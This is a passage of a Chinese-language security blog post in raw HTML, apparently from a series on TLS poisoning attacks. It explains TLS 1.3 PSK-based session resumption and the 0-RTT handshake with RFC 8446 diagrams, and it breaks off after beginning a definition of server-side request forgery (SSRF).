class="line">                                                       ServerHello</span><br><span class="line">                                                       + key_share</span><br><span class="line">                                             {EncryptedExtensions}</span><br><span class="line">                                             {CertificateRequest*}</span><br><span class="line">                                                    {Certificate*}</span><br><span class="line">                                              {CertificateVerify*}</span><br><span class="line">                                                        {Finished}</span><br><span class="line">                                 &lt;--------     [Application Data*]</span><br><span class="line">       {Certificate*}</span><br><span class="line">       {CertificateVerify*}</span><br><span class="line">       {Finished}                --------&gt;</span><br><span class="line">                                 &lt;--------      [NewSessionTicket]</span><br><span class="line">       [Application Data]        &lt;-------&gt;      [Application Data]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Subsequent Handshake:</span><br><span class="line">       ClientHello</span><br><span class="line">       + key_share*</span><br><span class="line">       + pre_shared_key          --------&gt;</span><br><span class="line">                                                       ServerHello</span><br><span class="line">                                                  + pre_shared_key</span><br><span class="line">                                                      + key_share*</span><br><span class="line">                                             {EncryptedExtensions}</span><br><span class="line">                                                        {Finished}</span><br><span class="line">                                 &lt;--------     [Application Data*]</span><br><span class="line">       {Finished}                --------&gt;</span><br><span class="line">       [Application Data]        &lt;-------&gt;      [Application Data]</span><br><span class="line"></span><br><span class="line">            Figure 3: Message Flow <span class="hljs-keyword">for</span> Resumption <span class="hljs-keyword">and</span> PSK</span><br></pre></td></tr></tbody></table></figure><p></p><ol><li>&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5E26;&#x6709; key_share &#x6269;&#x5C55;&#x7684; ClientHello &#x6D88;&#x606F;&#x3002;&#x8BE5;&#x6269;&#x5C55;&#x5217;&#x51FA;&#x4E86;&#x5BA2;&#x6237;&#x7AEF;&#x652F;&#x6301;&#x7684;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#x52A0;&#x5BC6;&#x65B9;&#x6CD5;&#x3002;</li><li>&#x670D;&#x52A1;&#x5668;&#x7528;&#x4E00;&#x4E2A;&#x5E26;&#x6709; key_share &#x6269;&#x5C55;&#x540D;&#x7684; ServerHello &#x6D88;&#x606F;&#x8FDB;&#x884C;&#x54CD;&#x5E94;&#xFF0C;&#x8FD9;&#x4E2A;&#x6269;&#x5C55;&#x5305;&#x542B;&#x4E86;&#x5B83;&#x8981;&#x7528;&#x4E8E;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#x7684;&#x52A0;&#x5BC6;&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x5176;&#x53C2;&#x6570;&#x4E00;&#x540C;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</li><li>&#x670D;&#x52A1;&#x5668;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x4EA4;&#x6362;&#x8BA4;&#x8BC1;&#x6D88;&#x606F;&#x3002;</li><li>&#x670D;&#x52A1;&#x5668;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001; NewSessionTicket &#x6D88;&#x606F;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x4E2A; PSK &#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728; ClientHello &#x6D88;&#x606F;&#x7684; pre_shared_key &#x6269;&#x5C55;&#x4E2D;&#x5305;&#x542B;&#x8FD9;&#x4E2A; PSK &#xFF0C;&#x7528;&#x4E8E;&#x672A;&#x6765;&#x7684;&#x63E1;&#x624B;&#x3002;</li><li>&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x73B0;&#x5728;&#x53EF;&#x4EE5;&#x4EA4;&#x6362;&#x52A0;&#x5BC6;&#x7684;&#x5E94;&#x7528;&#x6570;&#x636E;&#x3002;</li><li>&#x5728;&#x672A;&#x6765;&#x7684;&#x63E1;&#x624B;&#x4E2D;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5305;&#x542B; key_share &#x548C; pre_shared_key &#x6269;&#x5C55;&#x540D;&#x7684; ClientHello &#x6D88;&#x606F;&#x3002; pre_shared_key &#x6269;&#x5C55;&#x5305;&#x542B; NewTicketSession &#x6D88;&#x606F;&#x4E2D;&#x53D1;&#x9001;&#x7684; PSK &#x3002;</li><li>&#x670D;&#x52A1;&#x5668;&#x7528;&#x5305;&#x542B; pre_shared_key &#x548C; key_share &#x6269;&#x5C55;&#x540D;&#x7684; ServerHello &#x6D88;&#x606F;&#x4F5C;&#x51FA;&#x54CD;&#x5E94;&#x3002; pre_shared_key &#x6269;&#x5C55;&#x5305;&#x542B;&#x670D;&#x52A1;&#x5668;&#x540C;&#x610F;&#x4F7F;&#x7528;&#x7684; PSK &#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x53C2;&#x6570;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</li><li>&#x670D;&#x52A1;&#x5668;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x4E92;&#x76F8;&#x53D1;&#x9001; Finished &#x6D88;&#x606F;&#xFF0C;&#x4E4B;&#x540E;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x4EA4;&#x6362;&#x52A0;&#x5BC6;&#x7684;&#x5E94;&#x7528;&#x6570;&#x636E;&#x3002;</li></ol><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x76F4;&#x89C2;&#x611F;&#x53D7;&#x4E00;&#x4E0B; TLS 1.3 &#x57FA;&#x4E8E; PSK &#x7684;&#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/1.png" alt></p><p>&#x5982;&#x4E0A;&#x56FE;&#x6240;&#x793A;&#xFF0C;Client &#x7B2C;&#x4E00;&#x6B21;&#x4E0E; Server &#x63E1;&#x624B;&#x53D1;&#x9001; Client Hello &#x6D88;&#x606F;&#x65F6;&#xFF0C;&#x53EA;&#x5305;&#x542B;&#x4E86; key_share &#x62D3;&#x5C55;&#xFF0C;Server &#x4E5F;&#x505A;&#x51FA;&#x54CD;&#x5E94;&#x7684;&#x56DE;&#x5E94;&#xFF0C;&#x4F7F;&#x7528;&#x5305;&#x542B; key_share &#x62D3;&#x5C55;&#x7684;&#x6D88;&#x606F;&#x8FDB;&#x884C;&#x56DE;&#x5E94;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/2.png" alt></p><p>Client &#x5728;&#x7B2C;&#x4E8C;&#x6B21;&#x53D1;&#x9001; Client Hello &#x6D88;&#x606F;&#x65F6;&#xFF0C;&#x5E26;&#x4E0A;&#x4E86;&#x4E4B;&#x524D; Server &#x5728; NewSessionTicket &#x53D1;&#x9001;&#x7684; pre_shared_key &#xFF0C;&#x5C06;&#x5176;&#x4F5C;&#x4E3A;&#x62D3;&#x5C55;&#x53D1;&#x9001;&#x81F3; Server &#xFF0C;&#x968F;&#x540E; Server &#x54CD;&#x5E94; Server Hello &#x6D88;&#x606F;&#x65F6;&#xFF0C;&#x4E5F;&#x4F7F;&#x7528; pre_shared_key &#x4F5C;&#x4E3A;&#x62D3;&#x5C55;&#x54CD;&#x5E94;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x57FA;&#x4E8E; PSK &#x7684; Session Resumption </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/3.png" alt></p><p>&#x53EF;&#x80FD;&#x6709;&#x540C;&#x5B66;&#x4F1A;&#x95EE;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x4EEC;&#x770B;&#x4E0D;&#x5230;&#x7C7B;&#x4F3C; TLS 1.2 &#x5F53;&#x4E2D;&#x76F4;&#x63A5;&#x6709;&#x4E00;&#x4E2A; NewSessionTicket &#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ED4;&#x7EC6;&#x56DE;&#x987E;&#x4E00;&#x4E0B;&#x4E0A;&#x9762;&#x7684; RFC &#x6D41;&#x7A0B;&#x56FE;&#xFF0C;Server &#x8FD4;&#x56DE;&#x7684; NewSessionTicket &#x6D88;&#x606F;&#x6709;&#x4E2A;&#x4E2D;&#x62EC;&#x53F7;&#xFF0C;&#x800C;&#x8FD9;&#x91CC;&#x7684;&#x4E2D;&#x62EC;&#x53F7;&#x8868;&#x793A;&#x7684;&#x662F;&#x4F7F;&#x7528;&#x4ECE; <code>[sender]_application_traffic_secret_N</code> &#x5BFC;&#x51FA;&#x7684;&#x5BC6;&#x94A5;&#x4FDD;&#x62A4;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x4F7F;&#x7528; wireshark &#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x770B;&#x5230;&#x5176;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4F46;&#x662F;&#x5176;&#x4E2D;&#x6211;&#x4EEC;&#x4F7F;&#x7528; opnssl &#x65F6;&#x5019;&#x80FD;&#x591F;&#x66F4;&#x660E;&#x663E;&#x7684;&#x770B;&#x5230; Server &#x53D1;&#x8FC7;&#x6765;&#x7684; TLS Session Ticket &#xFF0C;&#x5982;&#x56FE;&#x6240;&#x793A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC; Client &#x5728;&#x8FDB;&#x884C;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x65F6;&#x6240;&#x643A;&#x5E26;&#x7684; PSK &#xFF0C;&#x5728;&#x4F7F;&#x7528; openssl &#x8FDB;&#x884C;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x63D0;&#x793A;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x6062;&#x590D;&#x4E86;&#x4F1A;&#x8BDD;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x4E00;&#x6B21; Session Resumption</p><h4 id="TLS-1-3-Session-Resumption-0-RTT"><a href="#TLS-1-3-Session-Resumption-0-RTT" class="headerlink" title="TLS 1.3 Session Resumption - 0-RTT"></a>TLS 1.3 Session Resumption - 0-RTT</h4><p>&#x867D;&#x7136; TLS 1.3 &#x6700;&#x5927;&#x7684;&#x4EAE;&#x70B9;&#x4E4B;&#x4E00;&#x662F; 0-RTT &#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x4E0D;&#x505A;&#x8BE6;&#x7EC6;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x4E0B;&#x9762;&#x7684; RFC 8446 &#x63D0;&#x4F9B;&#x7684;&#x6D41;&#x7A0B;&#x56FE;&#x770B;&#x51FA;&#x6765;&#xFF0C;&#x867D;&#x7136;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E2A; early_data &#xFF0C;&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x6765;&#x8BF4;&#x5E76;&#x4E0D;&#x662F;&#x91CD;&#x70B9;&#xFF0C;&#x4ED6;&#x4F9D;&#x7136;&#x4F7F;&#x7528;&#x4E86; pre_shared_key &#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x4E0A;&#x6587;&#x57FA;&#x4E8E; PSK &#x7684;&#x4F1A;&#x8BDD;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x6765;&#x8BF4;&#x57FA;&#x672C;&#x4E00;&#x81F4;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x505A;&#x8FC7;&#x591A;&#x5206;&#x6790;&#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x641C;&#x7D22;&#x4E86;&#x89E3;&#x3002; </p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Client                                               Server</span><br><span class="line"></span><br><span class="line">ClientHello</span><br><span class="line">+ early_data</span><br><span class="line">+ key_share*</span><br><span class="line">+ psk_key_exchange_modes</span><br><span class="line">+ pre_shared_key</span><br><span class="line">(Application Data*)     --------&gt;</span><br><span class="line">                                                ServerHello</span><br><span class="line">                                           + pre_shared_key</span><br><span class="line">                                               + key_share*</span><br><span class="line">                                      {EncryptedExtensions}</span><br><span class="line">                                              + early_data*</span><br><span class="line">                                                 {Finished}</span><br><span class="line">                        &lt;--------       [Application Data*]</span><br><span class="line">(EndOfEarlyData)</span><br><span class="line">{Finished}              --------&gt;</span><br><span class="line">[Application Data]      &lt;-------&gt;        [Application Data]</span><br><span class="line"></span><br><span class="line">      +  Indicates noteworthy extensions sent <span class="hljs-keyword">in</span> the</span><br><span class="line">         previously noted message.</span><br><span class="line"></span><br><span class="line">      *  Indicates optional <span class="hljs-keyword">or</span> situation-dependent</span><br><span class="line">         messages/extensions that are <span class="hljs-keyword">not</span> always sent.</span><br><span class="line"></span><br><span class="line">      () Indicates messages protected using keys</span><br><span class="line">         derived <span class="hljs-keyword">from</span> a client_early_traffic_secret.</span><br><span class="line"></span><br><span class="line">      {} Indicates messages protected using keys</span><br><span class="line">         derived <span class="hljs-keyword">from</span> a [sender]_handshake_traffic_secret.</span><br><span class="line"></span><br><span class="line">      [] Indicates messages protected using keys</span><br><span class="line">         derived <span class="hljs-keyword">from</span> [sender]_application_traffic_secret_N.</span><br><span class="line"></span><br><span class="line">      Figure 4: Message Flow <span class="hljs-keyword">for</span> a 0-RTT Handshake</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8BF7;&#x6C42;&#x4F2A;&#x9020; (Server-Side Request Forgery, SSRF) &#x662F;&#x4E00;&#x79CD;&#x7531;&#x653B;&#x51FB;&#x8005;&#x6784;&#x9020;&#x5F62;&#x6210;&#x7531;&#x670D;&#x52A1;&#x7AEF;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x7684;&#x4E00;&#x4E2A;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x3002;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;SSRF&#x653B;&#x51FB;&#x7684;&#x76EE;&#x6807;&#x662F;&#x4ECE;&#x5916;&#x7F51;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#x7684;&#x5185;&#x90E8;&#x7CFB;&#x7EDF;&#x3002;&#xFF08;&#x6B63;&#x662F;&#x56E0;&#x4E3A;&#x5B83;&#x662F;&#x7531;&#x670D;&#x52A1;&#x7AEF;&#x53D1;&#x8D77;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5B83;&#x80FD;&#x591F;&#x8BF7;&#x6C42;&#x5230;&#x4E0E;&#x5B83;&#x76F8;&#x8FDE;&#x800C;&#x4E0E;&#x5916;&#x7F51;&#x9694;&#x79BB;&#x7684;&#x5185;&#x90E8;&#x7CFB;&#x7EDF;&#xFF09;</p><p>SSRF 